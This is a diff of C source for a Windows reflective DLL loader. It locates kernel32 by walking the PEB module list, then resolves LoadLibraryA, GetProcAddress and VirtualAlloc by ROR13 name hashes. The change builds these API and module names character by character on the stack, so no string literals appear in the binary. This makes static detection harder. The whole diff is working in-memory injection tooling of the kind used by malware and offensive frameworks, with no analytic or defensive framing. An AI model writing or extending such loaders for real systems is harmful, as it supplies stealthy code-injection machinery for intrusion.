@@ -1208,23 +1208,36 @@ rl_self_base(void)
     }
 }
 
-/* kernel32 base via the loader module list (x64 offsets) */
+/* kernel32 base via the loader module list (x64 offsets).
+ * The target name is built on the STACK: this code runs from the raw
+ * file image where the linker's rip-relative data references (string
+ * literals) point at mapped-layout addresses, not raw offsets. */
 static ULONG_PTR
 rl_kernel32(void)
 {
-    ULONG_PTR peb = (ULONG_PTR)__readgsqword(0x60);
-    RL_LIST_ENTRY *ldr = *(RL_LIST_ENTRY **)(peb + 0x18);
-    RL_LIST_ENTRY *head = (RL_LIST_ENTRY *)((BYTE *)ldr + 0x20);
-    DWORD want = rl_ror13_w(L"kernel32.dll");
-    RL_LIST_ENTRY *link;
+    volatile wchar_t kn[13];
+    ULONG_PTR peb, k32 = 0;
+    RL_LIST_ENTRY *ldr, *head, *link;
+    DWORD want;
+
+    kn[0] = L'k'; kn[1] = L'e'; kn[2] = L'r'; kn[3] = L'n';
+    kn[4] = L'e'; kn[5] = L'l'; kn[6] = L'3'; kn[7] = L'2';
+    kn[8] = L'.'; kn[9] = L'd'; kn[10] = L'l'; kn[11] = L'l';
+    kn[12] = 0;
+    want = rl_ror13_w((const wchar_t *)kn);
+
+    peb = (ULONG_PTR)__readgsqword(0x60);
+    ldr = *(RL_LIST_ENTRY **)(peb + 0x18);
+    head = (RL_LIST_ENTRY *)((BYTE *)ldr + 0x20);
 
     for (link = head->Flink; link != head; link = link->Flink) {
         const wchar_t *name = *(const wchar_t **)((BYTE *)link + 0x50);
         if (name && rl_ror13_w(name) == want) {
-            return *(ULONG_PTR *)((BYTE *)link + 0x20);
+            k32 = *(ULONG_PTR *)((BYTE *)link + 0x20);
+            break;
         }
     }
-    return 0;
+    return k32;
 }
 
 /* Resolve an export by ANSI-name hash from a module base */
@@ -1282,9 +1295,23 @@ ReflectiveLoader(LPVOID param)
     k32 = rl_kernel32();
     if (!k32) return 0x5200000000ULL;
 
-    hLLA = rl_ror13_a("LoadLibraryA");
-    hGPA = rl_ror13_a("GetProcAddress");
-    hVA  = rl_ror13_a("VirtualAlloc");
+    /* stack-built API names — no .rdata literals (raw-image safe) */
+    {
+        volatile char nLLA[13], nGPA[15], nVA[13];
+        nLLA[0]='L'; nLLA[1]='o'; nLLA[2]='a'; nLLA[3]='d'; nLLA[4]='L';
+        nLLA[5]='i'; nLLA[6]='b'; nLLA[7]='r'; nLLA[8]='a'; nLLA[9]='r';
+        nLLA[10]='y'; nLLA[11]='A'; nLLA[12]=0;
+        nGPA[0]='G'; nGPA[1]='e'; nGPA[2]='t'; nGPA[3]='P'; nGPA[4]='r';
+        nGPA[5]='o'; nGPA[6]='c'; nGPA[7]='A'; nGPA[8]='d'; nGPA[9]='d';
+        nGPA[10]='r'; nGPA[11]='e'; nGPA[12]='s'; nGPA[13]='s'; nGPA[14]=0;
+        nVA[0]='V'; nVA[1]='i'; nVA[2]='r'; nVA[3]='t'; nVA[4]='u'; nVA[5]='a';
+        nVA[6]='l'; nVA[7]='A'; nVA[8]='l'; nVA[9]='l'; nVA[10]='o'; nVA[11]='c';
+        nVA[12]=0;
+
+        hLLA = rl_ror13_a((const char *)nLLA);
+        hGPA = rl_ror13_a((const char *)nGPA);
+        hVA  = rl_ror13_a((const char *)nVA);
+    }
     pLLA = (RL_LLA)rl_resolve(k32, hLLA);
     pGPA = (RL_GPA)rl_resolve(k32, hGPA);
     pVA  = (RL_VA)rl_resolve(k32, hVA);
